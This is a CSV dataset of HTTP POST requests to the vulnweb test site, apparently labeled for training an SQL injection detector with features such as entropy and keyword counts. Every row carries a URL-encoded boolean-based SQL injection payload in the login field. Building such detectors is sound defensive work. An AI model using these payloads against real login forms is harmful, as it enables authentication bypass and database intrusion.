url,method,body,header,sql_injection_keywords_url,sql_injection_keywords_body,sql_injection_keywords_header,header_entropy,body_entropy,number_of_special_chars,count_query_params,body_special_chars,query_param_length,path_depth,sql_injection
http://testphp.vulnweb.com/userinfo.php,0,uname=-9950%22%29%20OR%208102%3D8102%23&pass=fsdfsdf,"{""Content-Length"": ""52"", ""Host"": ""testphp.vulnweb.com"", ""Cache-Control"": ""max-age=0"", ""Origin"": ""http://testphp.vulnweb.com"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Upgrade-Insecure-Requests"": ""1"", ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"", ""Sec-GPC"": ""1"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Referer"": ""http://testphp.vulnweb.com/login.php"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""close""}",3,7,98,5.266637227525836,4.149878362697041,154,0,10,0,1,True
http://testphp.vulnweb.com/login.php,0,uname=-9950%22%29%20OR%208102%3D8102%23&pass=fsdfsdf,"{""Content-Length"": ""52"", ""Host"": ""testphp.vulnweb.com"", ""Cache-Control"": ""max-age=0"", ""Origin"": ""http://testphp.vulnweb.com"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Upgrade-Insecure-Requests"": ""1"", ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"", ""Sec-GPC"": ""1"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Referer"": ""http://testphp.vulnweb.com/login.php"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""close""}",3,7,98,5.266637227525836,4.149878362697041,154,0,10,0,1,True
http://testphp.vulnweb.com/userinfo.php,0,uname=-9555%22%29%29%20OR%209286%3D9623%23&pass=fsdfsdf,"{""Content-Length"": ""55"", ""Host"": ""testphp.vulnweb.com"", ""Cache-Control"": ""max-age=0"", ""Origin"": ""http://testphp.vulnweb.com"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Upgrade-Insecure-Requests"": ""1"", ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"", ""Sec-GPC"": ""1"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Referer"": ""http://testphp.vulnweb.com/login.php"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""close""}",3,8,98,5.260222532575358,4.107630396282637,154,0,11,0,1,True
http://testphp.vulnweb.com/login.php,0,uname=-9555%22%29%29%20OR%209286%3D9623%23&pass=fsdfsdf,"{""Content-Length"": ""55"", ""Host"": ""testphp.vulnweb.com"", ""Cache-Control"": ""max-age=0"", ""Origin"": ""http://testphp.vulnweb.com"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Upgrade-Insecure-Requests"": ""1"", ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"", ""Sec-GPC"": ""1"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Referer"": ""http://testphp.vulnweb.com/login.php"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""close""}",3,8,98,5.260222532575358,4.107630396282637,154,0,11,0,1,True
http://testphp.vulnweb.com/userinfo.php,0,uname=-7831%22%29%29%20OR%208102%3D8102%23&pass=fsdfsdf,"{""Content-Length"": ""55"", ""Host"": ""testphp.vulnweb.com"", ""Cache-Control"": ""max-age=0"", ""Origin"": ""http://testphp.vulnweb.com"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Upgrade-Insecure-Requests"": ""1"", ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"", ""Sec-GPC"": ""1"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Referer"": ""http://testphp.vulnweb.com/login.php"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""close""}",3,8,98,5.260222532575358,4.123171359414879,154,0,11,0,1,True
http://testphp.vulnweb.com/login.php,0,uname=-7831%22%29%29%20OR%208102%3D8102%23&pass=fsdfsdf,"{""Content-Length"": ""55"", ""Host"": ""testphp.vulnweb.com"", ""Cache-Control"": ""max-age=0"", ""Origin"": ""http://testphp.vulnweb.com"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Upgrade-Insecure-Requests"": ""1"", ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"", ""Sec-GPC"": ""1"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Referer"": ""http://testphp.vulnweb.com/login.php"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""close""}",3,8,98,5.260222532575358,4.123171359414879,154,0,11,0,1,True
http://testphp.vulnweb.com/userinfo.php,0,uname=-1708%22%29%29%29%20OR%203349%3D1081%23&pass=fsdfsdf,"{""Content-Length"": ""58"", ""Host"": ""testphp.vulnweb.com"", ""Cache-Control"": ""max-age=0"", ""Origin"": ""http://testphp.vulnweb.com"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Upgrade-Insecure-Requests"": ""1"", ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"", ""Sec-GPC"": ""1"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Referer"": ""http://testphp.vulnweb.com/login.php"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""close""}",3,9,98,5.262106162555172,4.17677797781159,154,0,12,0,1,True
http://testphp.vulnweb.com/login.php,0,uname=-1708%22%29%29%29%20OR%203349%3D1081%23&pass=fsdfsdf,"{""Content-Length"": ""58"", ""Host"": ""testphp.vulnweb.com"", ""Cache-Control"": ""max-age=0"", ""Origin"": ""http://testphp.vulnweb.com"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Upgrade-Insecure-Requests"": ""1"", ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"", ""Sec-GPC"": ""1"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Referer"": ""http://testphp.vulnweb.com/login.php"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""close""}",3,9,98,5.262106162555172,4.17677797781159,154,0,12,0,1,True
http://testphp.vulnweb.com/userinfo.php,0,uname=-9124%22%29%29%29%20OR%208102%3D8102%23&pass=fsdfsdf,"{""Content-Length"": ""58"", ""Host"": ""testphp.vulnweb.com"", ""Cache-Control"": ""max-age=0"", ""Origin"": ""http://testphp.vulnweb.com"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Upgrade-Insecure-Requests"": ""1"", ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"", ""Sec-GPC"": ""1"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Referer"": ""http://testphp.vulnweb.com/login.php"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""close""}",3,9,98,5.262106162555172,4.037920257035551,154,0,12,0,1,True
http://testphp.vulnweb.com/login.php,0,uname=-9124%22%29%29%29%20OR%208102%3D8102%23&pass=fsdfsdf,"{""Content-Length"": ""58"", ""Host"": ""testphp.vulnweb.com"", ""Cache-Control"": ""max-age=0"", ""Origin"": ""http://testphp.vulnweb.com"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Upgrade-Insecure-Requests"": ""1"", ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"", ""Sec-GPC"": ""1"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Referer"": ""http://testphp.vulnweb.com/login.php"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""close""}",3,9,98,5.262106162555172,4.037920257035551,154,0,12,0,1,True
http://testphp.vulnweb.com/userinfo.php,0,uname=-9978%27%29%29%20AS%20eDNZ%20WHERE%204030%3D4030%20OR%202063%3D2402%23&pass=fsdfsdf,"{""Content-Length"": ""89"", ""Host"": ""testphp.vulnweb.com"", ""Cache-Control"": ""max-age=0"", ""Origin"": ""http://testphp.vulnweb.com"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Upgrade-Insecure-Requests"": ""1"", ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"", ""Sec-GPC"": ""1"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Referer"": ""http://testphp.vulnweb.com/login.php"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""close""}",3,13,98,5.264753597546021,4.296865410023035,154,0,16,0,1,True
http://testphp.vulnweb.com/userinfo.php,0,uname=-5914%27%29%29%20AS%20nBKk%20WHERE%206398%3D6398%20OR%208102%3D8102%23&pass=fsdfsdf,"{""Content-Length"": ""89"", ""Host"": ""testphp.vulnweb.com"", ""Cache-Control"": ""max-age=0"", ""Origin"": ""http://testphp.vulnweb.com"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Upgrade-Insecure-Requests"": ""1"", ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"", ""Sec-GPC"": ""1"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Referer"": ""http://testphp.vulnweb.com/login.php"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""close""}",3,13,98,5.264753597546021,4.512046285230349,154,0,16,0,1,True
http://testphp.vulnweb.com/userinfo.php,0,uname=-7730%22%29%29%20AS%20cugk%20WHERE%203178%3D3178%20OR%209493%3D6404%23&pass=fsdfsdf,"{""Content-Length"": ""89"", ""Host"": ""testphp.vulnweb.com"", ""Cache-Control"": ""max-age=0"", ""Origin"": ""http://testphp.vulnweb.com"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Upgrade-Insecure-Requests"": ""1"", ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"", ""Sec-GPC"": ""1"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Referer"": ""http://testphp.vulnweb.com/login.php"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""close""}",3,13,98,5.264753597546021,4.495569866108035,154,0,16,0,1,True
http://testphp.vulnweb.com/login.php,0,uname=-7730%22%29%29%20AS%20cugk%20WHERE%203178%3D3178%20OR%209493%3D6404%23&pass=fsdfsdf,"{""Content-Length"": ""89"", ""Host"": ""testphp.vulnweb.com"", ""Cache-Control"": ""max-age=0"", ""Origin"": ""http://testphp.vulnweb.com"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Upgrade-Insecure-Requests"": ""1"", ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"", ""Sec-GPC"": ""1"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Referer"": ""http://testphp.vulnweb.com/login.php"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""close""}",3,13,98,5.264753597546021,4.495569866108035,154,0,16,0,1,True
http://testphp.vulnweb.com/userinfo.php,0,uname=-8561%22%29%29%20AS%20ubrU%20WHERE%202689%3D2689%20OR%208102%3D8102%23&pass=fsdfsdf,"{""Content-Length"": ""89"", ""Host"": ""testphp.vulnweb.com"", ""Cache-Control"": ""max-age=0"", ""Origin"": ""http://testphp.vulnweb.com"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Upgrade-Insecure-Requests"": ""1"", ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"", ""Sec-GPC"": ""1"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Referer"": ""http://testphp.vulnweb.com/login.php"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""close""}",3,13,98,5.264753597546021,4.383013212698169,154,0,16,0,1,True
http://testphp.vulnweb.com/login.php,0,uname=-8561%22%29%29%20AS%20ubrU%20WHERE%202689%3D2689%20OR%208102%3D8102%23&pass=fsdfsdf,"{""Content-Length"": ""89"", ""Host"": ""testphp.vulnweb.com"", ""Cache-Control"": ""max-age=0"", ""Origin"": ""http://testphp.vulnweb.com"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Upgrade-Insecure-Requests"": ""1"", ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"", ""Sec-GPC"": ""1"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Referer"": ""http://testphp.vulnweb.com/login.php"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""close""}",3,13,98,5.264753597546021,4.383013212698169,154,0,16,0,1,True
http://testphp.vulnweb.com/userinfo.php,0,uname=-1950%27%29%20AS%20JDNZ%20WHERE%206915%3D6915%20OR%209104%3D3316%23&pass=fsdfsdf,"{""Content-Length"": ""86"", ""Host"": ""testphp.vulnweb.com"", ""Cache-Control"": ""max-age=0"", ""Origin"": ""http://testphp.vulnweb.com"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Upgrade-Insecure-Requests"": ""1"", ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"", ""Sec-GPC"": ""1"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Referer"": ""http://testphp.vulnweb.com/login.php"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""close""}",3,12,98,5.262106162555172,4.5375258680747095,154,0,15,0,1,True
http://testphp.vulnweb.com/userinfo.php,0,uname=-6326%27%29%20AS%20HYee%20WHERE%201812%3D1812%20OR%208102%3D8102%23&pass=fsdfsdf,"{""Content-Length"": ""86"", ""Host"": ""testphp.vulnweb.com"", ""Cache-Control"": ""max-age=0"", ""Origin"": ""http://testphp.vulnweb.com"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Upgrade-Insecure-Requests"": ""1"", ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"", ""Sec-GPC"": ""1"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Referer"": ""http://testphp.vulnweb.com/login.php"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""close""}",3,12,98,5.262106162555172,4.328866304440812,154,0,15,0,1,True
http://testphp.vulnweb.com/userinfo.php,0,uname=-8492%22%29%20AS%20WIuQ%20WHERE%208615%3D8615%20OR%204469%3D7421%23&pass=fsdfsdf,"{""Content-Length"": ""86"", ""Host"": ""testphp.vulnweb.com"", ""Cache-Control"": ""max-age=0"", ""Origin"": ""http://testphp.vulnweb.com"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Upgrade-Insecure-Requests"": ""1"", ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"", ""Sec-GPC"": ""1"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Referer"": ""http://testphp.vulnweb.com/login.php"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""close""}",3,12,98,5.262106162555172,4.576120593876843,154,0,15,0,1,True
http://testphp.vulnweb.com/login.php,0,uname=-8492%22%29%20AS%20WIuQ%20WHERE%208615%3D8615%20OR%204469%3D7421%23&pass=fsdfsdf,"{""Content-Length"": ""86"", ""Host"": ""testphp.vulnweb.com"", ""Cache-Control"": ""max-age=0"", ""Origin"": ""http://testphp.vulnweb.com"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Upgrade-Insecure-Requests"": ""1"", ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"", ""Sec-GPC"": ""1"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Referer"": ""http://testphp.vulnweb.com/login.php"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""close""}",3,12,98,5.262106162555172,4.576120593876843,154,0,15,0,1,True
http://testphp.vulnweb.com/userinfo.php,0,uname=-8717%22%29%20AS%20KUKo%20WHERE%203529%3D3529%20OR%208102%3D8102%23&pass=fsdfsdf,"{""Content-Length"": ""86"", ""Host"": ""testphp.vulnweb.com"", ""Cache-Control"": ""max-age=0"", ""Origin"": ""http://testphp.vulnweb.com"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Upgrade-Insecure-Requests"": ""1"", ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"", ""Sec-GPC"": ""1"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Referer"": ""http://testphp.vulnweb.com/login.php"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""close""}",3,12,98,5.262106162555172,4.4264286245055,154,0,15,0,1,True
http://testphp.vulnweb.com/login.php,0,uname=-8717%22%29%20AS%20KUKo%20WHERE%203529%3D3529%20OR%208102%3D8102%23&pass=fsdfsdf,"{""Content-Length"": ""86"", ""Host"": ""testphp.vulnweb.com"", ""Cache-Control"": ""max-age=0"", ""Origin"": ""http://testphp.vulnweb.com"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Upgrade-Insecure-Requests"": ""1"", ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"", ""Sec-GPC"": ""1"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Referer"": ""http://testphp.vulnweb.com/login.php"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""close""}",3,12,98,5.262106162555172,4.4264286245055,154,0,15,0,1,True
http://testphp.vulnweb.com/userinfo.php,0,uname=-6172%29%20OR%204126%3D7568%23&pass=fsdfsdf,"{""Content-Length"": ""49"", ""Host"": ""testphp.vulnweb.com"", ""Cache-Control"": ""max-age=0"", ""Origin"": ""http://testphp.vulnweb.com"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Upgrade-Insecure-Requests"": ""1"", ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"", ""Sec-GPC"": ""1"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Referer"": ""http://testphp.vulnweb.com/login.php"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""close""}",3,6,98,5.264753597546021,4.418195752623562,154,0,9,0,1,True
http://testphp.vulnweb.com/login.php,0,uname=-6172%29%20OR%204126%3D7568%23&pass=fsdfsdf,"{""Content-Length"": ""49"", ""Host"": ""testphp.vulnweb.com"", ""Cache-Control"": ""max-age=0"", ""Origin"": ""http://testphp.vulnweb.com"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Upgrade-Insecure-Requests"": ""1"", ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"", ""Sec-GPC"": ""1"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Referer"": ""http://testphp.vulnweb.com/login.php"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""close""}",3,6,98,5.264753597546021,4.418195752623562,154,0,9,0,1,True
http://testphp.vulnweb.com/userinfo.php,0,uname=-9401%29%20OR%208102%3D8102%23&pass=fsdfsdf,"{""Content-Length"": ""49"", ""Host"": ""testphp.vulnweb.com"", ""Cache-Control"": ""max-age=0"", ""Origin"": ""http://testphp.vulnweb.com"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Upgrade-Insecure-Requests"": ""1"", ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"", ""Sec-GPC"": ""1"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Referer"": ""http://testphp.vulnweb.com/login.php"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""close""}",3,6,98,5.264753597546021,4.222080640900361,154,0,9,0,1,True
http://testphp.vulnweb.com/login.php,0,uname=-9401%29%20OR%208102%3D8102%23&pass=fsdfsdf,"{""Content-Length"": ""49"", ""Host"": ""testphp.vulnweb.com"", ""Cache-Control"": ""max-age=0"", ""Origin"": ""http://testphp.vulnweb.com"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Upgrade-Insecure-Requests"": ""1"", ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"", ""Sec-GPC"": ""1"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Referer"": ""http://testphp.vulnweb.com/login.php"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""close""}",3,6,98,5.264753597546021,4.222080640900361,154,0,9,0,1,True
